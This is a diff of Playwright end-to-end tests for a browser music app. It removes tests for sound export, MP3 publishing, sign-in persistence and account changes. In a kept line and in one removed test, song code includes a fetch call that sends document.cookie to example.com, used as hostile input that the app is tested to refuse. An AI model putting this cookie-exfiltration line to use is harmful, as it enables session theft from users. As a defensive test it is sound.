@@ -1,30 +1,6 @@
 import { expect, test, type Page } from '@playwright/test'
-import { readFileSync } from 'node:fs'
 
 const SONG = 'setcpm(120/4)\n\nvoc: s("long_take")\n'
-const RATE = 44100
-const LEAD = 0.05
-
-// Twelve seconds of a tone as a 16 bit WAV file, a little over a megabyte, with a twentieth of
-// a second of silence in front so that where it starts can be told.
-function longTake(): Buffer {
-    const frames = RATE * 12
-    const file = Buffer.alloc(44 + frames * 2)
-    file.write('RIFF', 0, 'latin1')
-    file.writeUInt32LE(36 + frames * 2, 4)
-    file.write('WAVEfmt ', 8, 'latin1')
-    file.writeUInt32LE(16, 16)
-    file.writeUInt16LE(1, 20)
-    file.writeUInt16LE(1, 22)
-    file.writeUInt32LE(RATE, 24)
-    file.writeUInt32LE(RATE * 2, 28)
-    file.writeUInt16LE(2, 32)
-    file.writeUInt16LE(16, 34)
-    file.write('data', 36, 'latin1')
-    file.writeUInt32LE(frames * 2, 40)
-    for (let at = Math.round(RATE * LEAD); at < frames; at++) file.writeInt16LE(Math.round(Math.sin((at / RATE) * 2 * Math.PI * 330) * 20000), 44 + at * 2)
-    return file
-}
 
 async function open(page: Page, song = SONG) {
     await page.addInitScript((text) => {
@@ -38,72 +14,7 @@ async function open(page: Page, song = SONG) {
     await expect(page.getByTestId('sounds')).toHaveText('Sounds ready', { timeout: 30000 })
 }
 
-async function addLongTake(page: Page) {
-    await page.getByRole('button', { name: 'Sounds', exact: true }).click()
-    await page.getByTestId('sound-browser').getByRole('radio', { name: /^Yours/ }).click()
-    await page.getByTestId('own-files').setInputFiles([{ name: 'long take.wav', mimeType: 'audio/wav', buffer: longTake() }])
-    await expect(page.getByTestId('sound-browser').locator('.sb-i code')).toHaveText('long_take')
-}
-
 const prepare = (page: Page) => page.evaluate(() => (window as any).__weft.prepareToPublish())
-
-// Where the sound the app keeps under this name starts, in seconds, and what kind of file it is.
-const kept = (page: Page, name: string) =>
-    page.evaluate(async (wanted) => {
-        const database = await new Promise<IDBDatabase>((resolve, reject) => {
-            const request = indexedDB.open('weft', 1)
-            request.onsuccess = () => resolve(request.result)
-            request.onerror = () => reject(request.error)
-        })
-        const sound = await new Promise<{ type: string; data: ArrayBuffer }>((resolve, reject) => {
-            const request = database.transaction('sounds').objectStore('sounds').get(wanted)
-            request.onsuccess = () => resolve(request.result)
-            request.onerror = () => reject(request.error)
-        })
-        const heard = await (window as any).__weft.engine.decodeAudio(sound.data.slice(0))
-        const samples: Float32Array = heard.channels[0]
-        let peak = 0
-        for (const sample of samples) peak = Math.max(peak, Math.abs(sample))
-        const first = samples.findIndex((sample) => Math.abs(sample) >= peak * 0.1)
-        return { type: sound.type, onset: first / heard.sampleRate }
-    }, name)
-
-test('a song file that is exported holds its sounds as they are, however large', async ({ page }) => {
-    await open(page)
-    await addLongTake(page)
-    await page.getByTestId('top').getByRole('button', { name: 'Export', exact: true }).click()
-    const dialog = page.getByTestId('export')
-    await expect(dialog.getByRole('button', { name: /small/i })).toHaveCount(0)
-    const [download] = await Promise.all([page.waitForEvent('download'), dialog.getByRole('button', { name: 'Song file (.weft)', exact: true }).click()])
-    const text = readFileSync((await download.path())!, 'utf8')
-    expect(text.length).toBeGreaterThan(1024 * 1024)
-    const packed = JSON.parse(text).sounds[0]
-    expect(packed).toMatchObject({ name: 'long_take', file: 'long take.wav', type: 'audio/wav' })
-    expect(packed.onset).toBeUndefined()
-    expect(Buffer.from(packed.data, 'base64').equals(longTake())).toBe(true)
-})
-
-test('for publishing the sounds are made into MP3 so the file fits, and they start where they did when it is opened', async ({ page, browser }) => {
-    await open(page)
-    await addLongTake(page)
-    const made = await prepare(page)
-    expect(made).toMatchObject({ ok: true, kbps: 128 })
-    expect(made.text.length).toBeLessThan(400 * 1024)
-    const packed = JSON.parse(made.text).sounds[0]
-    expect(packed).toMatchObject({ name: 'long_take', file: 'long take.mp3', type: 'audio/mpeg' })
-    expect(Math.abs(packed.onset - LEAD)).toBeLessThan(0.003)
-
-    const other = await (await browser.newContext()).newPage()
-    await other.goto('/')
-    await other.waitForFunction(() => Boolean((window as any).__weft))
-    await expect(other.getByTestId('sounds')).toHaveText('Sounds ready', { timeout: 30000 })
-    await other.getByTestId('song-file').setInputFiles({ name: 'Untitled.weft', mimeType: 'application/json', buffer: Buffer.from(made.text) })
-    await expect(other.getByTestId('song-note')).toContainText('with 1 sound of its own')
-    const after = await kept(other, 'long_take')
-    expect(after.type).toBe('audio/wav')
-    expect(Math.abs(after.onset - LEAD)).toBeLessThan(0.003)
-    await other.context().close()
-})
 
 test('a song with code that is more than music is not made ready for publishing', async ({ page }) => {
     await open(page, 'setcpm(120/4)\n\ndrums: s("bd*4")\nfetch("https://example.com/" + document.cookie)\n')
@@ -185,35 +96,6 @@ test('a song is published from the app: make an account, say what the song is, a
     await expect(page.getByTestId('account-count')).toHaveText('You have used 0 of your 10 songs.')
 })
 
-test('the app stays signed in after a restart', async ({ page }) => {
-    await open(page, SYNTHS)
-    await openPublish(page)
-    await signIn(page)
-    await page.reload()
-    await page.waitForFunction(() => Boolean((window as any).__weft))
-    await openPublish(page)
-    await expect(page.getByTestId('publish-count')).toHaveText('You have used 0 of your 10 songs.')
-})
-
-test('a song with code that is more than music cannot be published from the app', async ({ page }) => {
-    await open(page, `${SYNTHS}fetch("https://example.com/" + document.cookie)\n`)
-    await openPublish(page)
-    await signIn(page)
-    const refused = page.getByTestId('publish-refused')
-    await expect(refused).toContainText('This song cannot be published')
-    await expect(refused).toContainText('Line 6: fetch is not something a song can use. A song may hold only music code')
-    await expect(dialog(page).getByRole('button', { name: 'Publish', exact: true })).toBeDisabled()
-})
-
-test('the half minute people hear starts where most of the song plays for all of it, and can be moved', async ({ page }) => {
-    await open(page, 'setcpm(120/4)\n\nbass: note("c2").s("sawtooth").mask("<0!4 1!28>")\n\nlead: note("c4").s("triangle").mask("<0!8 1!16 0!8>")\n\nhigh: note("c5").s("sine").mask("<0!30 1!2>")\n')
-    await openPublish(page)
-    await signIn(page)
-    await expect(page.getByTestId('publish-from')).toHaveText('9')
-    await dialog(page).getByRole('button', { name: 'An earlier bar', exact: true }).click()
-    await expect(page.getByTestId('publish-from')).toHaveText('8')
-})
-
 test('an account needs a name, an address and a password of some length, and an address can have one account', async ({ page }) => {
     await open(page, SYNTHS)
     await openPublish(page)
@@ -284,38 +166,6 @@ test('your songs are kept from the app: what a song says, whether it is shown, a
     await expect(page.getByTestId('account-count')).toContainText('1 is published and 0 hidden.')
     expect((await page.request.get(address)).status()).toBe(200)
     await shown.close()
-})
-
-test('your name and your password are changed in the app', async ({ page }) => {
-    const { email, address } = await withASong(page)
-    const note = page.getByTestId('account-note')
-    await account(page).getByRole('tab', { name: 'Profile', exact: true }).click()
-    await account(page).getByLabel('Your name', { exact: true }).fill('Ante L')
-    await account(page).getByRole('button', { name: 'Save', exact: true }).click()
-    await expect(note).toHaveText('Your name is changed.')
-    const shown = await page.context().newPage()
-    await shown.goto(address)
-    await expect(shown.locator('body')).toContainText('Ante L')
-    await shown.close()
-
-    await expect(account(page).getByRole('tab', { name: 'Jams', exact: true })).toHaveCount(0)
-
-    await account(page).getByRole('tab', { name: 'Account', exact: true }).click()
-    await account(page).getByLabel('Your password now').fill('not it')
-    await account(page).getByLabel('Your new password').fill('a new password 43')
-    await account(page).getByRole('button', { name: 'Change it', exact: true }).click()
-    await expect(note).toHaveText('The password you have now is not right.')
-    await account(page).getByLabel('Your password now').fill(PASSWORD)
-    await account(page).getByRole('button', { name: 'Change it', exact: true }).click()
-    await expect(note).toHaveText('Your password is changed.')
-    await account(page).getByRole('button', { name: 'Sign out', exact: true }).click()
-    await account(page).getByLabel('Your password', { exact: true }).fill(PASSWORD)
-    await account(page).getByLabel('Your password', { exact: true }).press('Enter')
-    await expect(note).toHaveText('The email or the password is not right.')
-    await account(page).getByLabel('Your password', { exact: true }).fill('a new password 43')
-    await account(page).getByLabel('Your password', { exact: true }).press('Enter')
-    await expect(page.getByTestId('account-count')).toContainText('You have used 1 of your 10 songs.')
-    expect(email).toContain('@')
 })
 
 test('a forgotten password is replaced with a code typed into the app', async ({ page }) => {
